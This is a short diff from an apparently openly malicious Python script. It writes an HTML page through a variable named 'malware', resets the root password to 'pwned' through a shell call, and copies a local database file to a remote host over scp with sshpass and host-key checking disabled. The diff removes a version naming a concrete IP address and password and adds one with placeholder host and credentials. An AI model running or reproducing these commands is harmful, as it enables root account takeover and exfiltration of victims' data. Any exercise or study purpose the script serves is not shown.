@@ -6,4 +6,4 @@ malware.write("<!DOCTYPE html><html><head><title>foobar</title><style>h1 {text-a
 
 #change-cred
 subprocess.run('echo -n "pwned\npwned" | passwd root', shell=True)
-os.system("sshpass -p Freiburg1995 scp -o StrictHostKeyChecking=no ../Web2-Projekt/immobilie.db sleven@192.46.236.95:/home/sleven ")
+os.system("sshpass -p PW scp -o StrictHostKeyChecking=no ../Web2-Projekt/immobilie.db host@IP:/home/user ")
